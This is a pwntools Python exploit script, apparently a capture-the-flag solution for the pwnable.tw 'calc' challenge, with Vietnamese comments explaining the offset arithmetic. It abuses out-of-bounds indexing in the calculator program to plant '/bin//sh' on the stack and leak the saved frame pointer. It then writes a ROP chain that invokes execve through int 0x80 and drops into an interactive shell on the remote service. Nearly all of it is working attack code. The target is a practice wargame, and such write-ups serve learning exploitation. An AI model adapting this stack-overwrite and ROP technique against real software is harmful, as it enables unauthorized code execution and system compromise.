from pwn import *

binn = 0x6e69622f
sh = 0x0068732f
offset_ebp = 32

# Helper function to convert bytes to integer
def toInt(s):
    s = s.strip()
    if not s.startswith(b'-'):
        return int(s)
    else:
        return (int(s[1:]) ^ 0xffffffff) + 1

# Helper function to calculate difference and format as string
def toStr(ori, new):
    if hex(new).startswith('0xf'):
        new = int('-' + str((new ^ 0xffffffff) + 1))
    print("ori:", str(ori))
    print("new:", str(new))
    if new > ori:
        return '+' + str(new - ori)
    elif new < ori:
        return '-' + str(ori - new)
    else:
        return ''

# Connect to the process or remote server
#s = process('./calc')
s = remote('chall.pwnable.tw', 10100)

print(s.recvuntil('\n'))

# Write '/bin//sh' to stack 
s.sendline('+777')
s.sendline('+777' + toStr(toInt(s.recvuntil('\n')), binn))
print(s.recvuntil('\n'))

s.sendline('+778')
s.sendline('+778' + toStr(toInt(s.recvuntil('\n')), sh))
print(s.recvuntil('\n'))

# Leak prev_ebp (ebp_main) to cal ebp_calc
s.sendline('+360')
prev_ebp = s.recvuntil('\n')
prev_ebp = toInt(prev_ebp)
print('prev_ebp:', str(prev_ebp))

ebp = prev_ebp - offset_ebp
print('ebp calc:', hex(ebp))

# ROP gadgets and addresses
rop_gadgets = [
    (0x0805c34b, 'pop eax'),
    (0xb, 'value for eax (0xb)'),
    (0x080701d0, 'pop edx ecx ebx'),
    (0, 'value for edx (0)'),
    (0, 'value for ecx (0)'),
    (ebp + (777 - 360) * 4, 'address of "/bin//sh"'), # why (X-360)*4?
    (0x08049a21, 'int 0x80')
]
'''
X ở đây là vị trí mình chọn tùy ý, còn 360 là ở đâu ra, ta có ebp - 0x5A0 => count = v[0]
mà 0x5A0 = 360 => v[360] =  ebp - 0x5A0 + hex(360) = ebp, vậy nên có nghĩa là v[360] = ebp, leak được cái này => ebp của hàm main
ta cùng tính được offset giữa ebp main và ebp calc = 32, từ đây => ebp_calc = ebp_main - 32
có được ebp_calc có nghĩa ta có thể tính được địa chỉ lưu chuỗi bin/sh
nãy ta lưu bin/sh ở v[777]
Mà nên nhớ v được khai báo là ebp - 0x5A0 =  ebp - 360
và 
v[0] = ebp - 360 + 0 = ebp - 0x5A0
v[1] = ebp - 360 + 1 = ebp - 0x59C
.....
v[777] = ebp - 360 + 777 = 417, cần convert sang int tương ứng với byte => mỗi nấc 4 byte => x4

còn lý do mà send(+700) rồi lại send(+700+inject...) là do trong quá trình +700 đã phải setup với cái, sau đấy +- thêm sẽ làm thay đổi giá trị

'''

# ROP chain setup loop
for line_num, (addr, desc) in enumerate(rop_gadgets, start=361):
    s.sendline(f'+{line_num}')
    s.sendline(f'+{line_num}' + toStr(toInt(s.recvuntil('\n')), addr))
    print(s.recvuntil('\n'))

s.sendline('')
s.interactive()
